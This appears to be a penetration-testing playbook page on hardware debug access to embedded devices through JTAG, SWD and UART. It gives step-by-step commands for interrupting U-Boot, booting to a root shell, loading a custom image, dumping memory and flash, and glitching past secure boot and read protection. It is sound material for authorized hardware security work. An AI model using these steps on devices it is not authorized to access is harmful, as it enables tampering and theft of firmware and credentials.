# JTAG and UART — Boundary Scan and Console Access

## When this applies

- Physical access to an embedded device (router, IP camera, IoT gadget, automotive ECU) is in scope.
- Goal is to gain debug-level access via JTAG (boundary scan, processor halt, memory dump) or UART (serial console for boot logs and shell).
- Pre-cursor to firmware extraction, password recovery, or live exploitation.

## Technique

JTAG (IEEE 1149.1) is a 4–5-pin debug bus exposing the processor's TAP (Test Access Port) — once connected, an attacker can halt the CPU, dump memory, set breakpoints, and (often) read flash. UART (Universal Asynchronous Receiver/Transmitter) is a 3-pin serial interface (TX, RX, GND) frequently exposed for boot logs and root shells. Both are under-protected on consumer hardware.

## Steps

### 1. Identify candidate test points on the PCB

Visual inspection:
- 2x5, 2x6, 2x10 header footprints near the SoC = likely JTAG (or BDM, ARM SWD)
- 4-pin / 6-pin row near the SoC, often labelled `TX RX GND VCC` or unlabelled = likely UART
- Test pads (round/oval pads without a header) — solder a header or use spring-loaded probes (pogo pins)

### 2. Pin identification with a logic analyzer

Connect a logic analyzer to all candidate pins and power on the device. Look for:

**UART TX**: continuous activity at a fixed baud rate (often 115200), idle-high
**UART RX**: usually quiet (input from external device)
**JTAG TCK**: clock pattern at fixed rate
**JTAG TMS / TDI / TDO**: slower bursts of activity during boot self-test

JTAGulator (Joe Grand's tool) automates pin identification:

```text
# Connect all 24 channels to candidate pins
# Run "Identify JTAG pinout (IDCODE Scan)"
# Tool tries every permutation, reports successful TCK/TMS/TDI/TDO/TRST mapping
```

### 3. UART baud-rate detection

```bash
# Auto-detect baud rate
python3 -c "
from baud import find_baud
find_baud('/dev/ttyUSB0')
"

# Or manually try common rates with screen / minicom
sudo screen /dev/ttyUSB0 115200
sudo screen /dev/ttyUSB0 9600
sudo screen /dev/ttyUSB0 38400
sudo screen /dev/ttyUSB0 57600
```

Common baud rates: 9600, 19200, 38400, 57600, **115200** (most common on modern embedded), 230400, 460800, 921600.

### 4. UART console interaction

Once connected at the right baud rate:

```bash
# Connect with picocom (cleaner exit than screen)
picocom -b 115200 /dev/ttyUSB0

# Or screen
sudo screen /dev/ttyUSB0 115200

# Or minicom
sudo minicom -D /dev/ttyUSB0 -b 115200
```

Boot output typically reveals:
- Bootloader (U-Boot, RedBoot, BARE-BOX) and version
- Kernel command line (root device, console settings, debug flags)
- Filesystem mount paths
- Init script execution
- Login prompt (often `root` / blank password or default `admin`/`admin`)

### 5. Bootloader interrupt for U-Boot shell

Most U-Boot loaders accept a key press (often Space, ESC, or `s`) during the autoboot countdown:

```text
Hit any key to stop autoboot:  3
=>
```

In the U-Boot shell:

```text
=> printenv                  # show env vars (often reveals bootargs, mtdparts, IPs)
=> md.b 0x80000000 0x100     # dump memory at address
=> nand read 0x80000000 0x100000 0x800000   # read NAND flash to RAM
=> tftpboot 0x80000000 evil.img             # network-boot a custom image
=> setenv bootargs 'init=/bin/sh'           # boot to single-user shell
=> bootm
```

### 6. JTAG with OpenOCD

```bash
# Start OpenOCD with appropriate config
openocd -f interface/ftdi/jtagkey.cfg -f target/stm32f1x.cfg

# In another terminal: GDB or telnet
telnet localhost 4444     # OpenOCD console
> reset halt
> mdw 0x08000000 100      # dump memory
> dump_image firmware.bin 0x08000000 0x100000   # save flash

# Or via GDB
arm-none-eabi-gdb
> target remote :3333
> monitor reset halt
> dump binary memory firmware.bin 0x08000000 0x08100000
```

### 7. SWD (ARM Cortex-M Serial Wire Debug)

SWD is JTAG's successor on ARM Cortex-M. 2-pin (SWDIO, SWCLK) instead of 4-pin TAP:

```bash
# OpenOCD with SWD transport
openocd -f interface/stlink-v2.cfg -f target/stm32f4x.cfg -c "transport select swd"
```

ST-Link, J-Link, Black Magic Probe — all support SWD.

### 8. Flash extraction via JTAG/SWD

```bash
# OpenOCD
> flash banks
> flash read_bank 0 firmware.bin

# Or with stm32flash for STM32
stm32flash -r firmware.bin /dev/ttyUSB0

# avrdude for AVR
avrdude -c usbasp -p m328p -U flash:r:firmware.hex:i
```

After dumping, analyze with `binwalk` (see `scenarios/hardware/firmware-extraction.md`).

### 9. Glitch / fault injection (advanced)

Voltage / clock glitching during boot can bypass secure-boot signature verification:
- ChipWhisperer, PicoEMP for controlled glitching
- Trigger on a known boot signal, inject a clock or voltage glitch at the right ms offset

Out of scope for typical pentest engagements but worth noting for hardware research.

### 10. Read protection / fuses

Many MCUs have a `Read Out Protection` (ROP / RDP / CRP) fuse that prevents JTAG/SWD memory reads:
- STM32 RDP Level 1 — read-protected, but JTAG halt still allowed
- STM32 RDP Level 2 — fully locked, JTAG disabled
- AVR LB1 / LB2 fuses — similar
- ESP32 eFuse `JTAG_DISABLE`

If JTAG enumeration succeeds (IDCODE returned) but flash reads fail, check fuse state — may require glitching (research only).

## Verifying success

- UART: boot log printed, prompt accessible (login or U-Boot/`#`/`$` shell).
- JTAG: IDCODE scan returns valid IDs; OpenOCD `halt` succeeds; `mdw` dumps real memory.
- Flash dump: file size matches expected flash capacity; `binwalk firmware.bin` identifies known signatures (uImage, JFFS2, SquashFS).

## Common pitfalls

- **Wrong baud rate** — output is gibberish. Try common rates systematically.
- **TX/RX swap** — connect the device's TX to your adapter's RX, and vice versa. Some labs label from the device's perspective, others from the host's.
- **Voltage levels** — embedded UART is often 3.3V or 1.8V (rare). 5V FTDI cables can damage 3.3V hosts. Use a level-shifter or 3.3V FT232.
- **TRST not connected** — JTAG enumeration may hang without TRST# wired.
- **Active-low reset** vs active-high — getting reset polarity wrong holds the chip in reset, no JTAG response.
- **Read protection fuses** prevent memory dumps even with active JTAG. Check fuse state before assuming the chip is unprotected.
- **U-Boot autoboot interrupt window** is sometimes 0 seconds — solder a momentary button or write to the env config to extend.
- **Common-mode interference** when probing — keep ground leads short, twist with signal lines.

## Tools

- JTAGulator (pin identification)
- OpenOCD (JTAG/SWD universal debugger)
- ST-Link, J-Link, Black Magic Probe (SWD probes)
- Saleae Logic, sigrok / PulseView (logic analyzer)
- picocom, screen, minicom (UART terminal)
- USB-to-TTL adapter (FT232, CP2102, CH340)
- baud / pyserial (baud rate detection)
- ChipWhisperer (advanced glitching)
- binwalk, firmwalker (post-dump firmware analysis)
